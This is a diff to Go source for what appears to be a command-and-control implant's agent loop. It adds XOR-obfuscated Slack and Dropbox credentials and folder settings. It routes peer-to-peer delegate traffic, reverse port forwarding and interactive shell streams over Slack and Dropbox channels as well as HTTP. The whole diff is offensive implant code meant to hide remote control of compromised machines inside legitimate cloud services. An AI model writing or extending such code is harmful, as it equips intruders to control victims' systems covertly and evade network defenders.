@@ -103,6 +103,14 @@ func runAgent() {
 			proxyURL = xorDecodeString(proxyURL, keyBytes)
 			customHeaders = xorDecodeString(customHeaders, keyBytes)
 			fallbackHosts = xorDecodeString(fallbackHosts, keyBytes)
+			slackBotToken = xorDecodeString(slackBotToken, keyBytes)
+			slackChannelID = xorDecodeString(slackChannelID, keyBytes)
+			slackPollInterval = xorDecodeString(slackPollInterval, keyBytes)
+			dropboxToken = xorDecodeString(dropboxToken, keyBytes)
+			dropboxTaskFolder = xorDecodeString(dropboxTaskFolder, keyBytes)
+			dropboxResultFolder = xorDecodeString(dropboxResultFolder, keyBytes)
+			dropboxArchiveFolder = xorDecodeString(dropboxArchiveFolder, keyBytes)
+			dropboxPollInterval = xorDecodeString(dropboxPollInterval, keyBytes)
 			// Zero the XOR key — no longer needed after deobfuscation
 			zeroBytes(keyBytes)
 		}
@@ -315,31 +323,61 @@ func runAgent() {
 		if err := httpProfile.SealConfig(); err != nil {
 			log.Printf("seal failed: %v", err)
 		}
+	}
 
-		// Also create a TCP profile instance for P2P child management.
-		// Even HTTP egress agents can link to TCP children.
+	if transport != "tcp" {
+		// Non-TCP egress transports can still manage TCP child links, rpfwd, and interactive streams.
 		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
 		commands.SetTCPProfile(tcpP2P)
 
-		// Wire up delegate hooks so the HTTP profile routes P2P delegate messages
-		httpProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
-			return tcpP2P.DrainDelegatesOnly()
-		}
-		httpProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
-			return tcpP2P.DrainDelegatesAndEdges()
-		}
-		httpProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
-			tcpP2P.RouteToChildren(delegates)
-		}
-
-		// Wire up rpfwd hooks for reverse port forwarding
 		rpfwdManager := rpfwd.NewManager()
 		defer rpfwdManager.Close()
 		commands.SetRpfwdManager(rpfwdManager)
-		httpProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
-		httpProfile.HandleRpfwd = rpfwdManager.HandleMessages
-		httpProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
-		httpProfile.HandleInteractive = commands.RouteInteractiveInput
+
+		switch profile := c2.(type) {
+		case *http.HTTPProfile:
+			profile.GetDelegatesOnly = func() []structs.DelegateMessage {
+				return tcpP2P.DrainDelegatesOnly()
+			}
+			profile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
+				return tcpP2P.DrainDelegatesAndEdges()
+			}
+			profile.HandleDelegates = func(delegates []structs.DelegateMessage) {
+				tcpP2P.RouteToChildren(delegates)
+			}
+			profile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
+			profile.HandleRpfwd = rpfwdManager.HandleMessages
+			profile.GetInteractiveOutbound = commands.DrainInteractiveOutput
+			profile.HandleInteractive = commands.RouteInteractiveInput
+		case *slack.SlackProfile:
+			profile.GetDelegatesOnly = func() []structs.DelegateMessage {
+				return tcpP2P.DrainDelegatesOnly()
+			}
+			profile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
+				return tcpP2P.DrainDelegatesAndEdges()
+			}
+			profile.HandleDelegates = func(delegates []structs.DelegateMessage) {
+				tcpP2P.RouteToChildren(delegates)
+			}
+			profile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
+			profile.HandleRpfwd = rpfwdManager.HandleMessages
+			profile.GetInteractiveOutbound = commands.DrainInteractiveOutput
+			profile.HandleInteractive = commands.RouteInteractiveInput
+		case *dropbox.DropboxProfile:
+			profile.GetDelegatesOnly = func() []structs.DelegateMessage {
+				return tcpP2P.DrainDelegatesOnly()
+			}
+			profile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
+				return tcpP2P.DrainDelegatesAndEdges()
+			}
+			profile.HandleDelegates = func(delegates []structs.DelegateMessage) {
+				tcpP2P.RouteToChildren(delegates)
+			}
+			profile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
+			profile.HandleRpfwd = rpfwdManager.HandleMessages
+			profile.GetInteractiveOutbound = commands.DrainInteractiveOutput
+			profile.HandleInteractive = commands.RouteInteractiveInput
+		}
 	}
 
 	// Configure child process protections (Windows: block non-Microsoft DLLs)
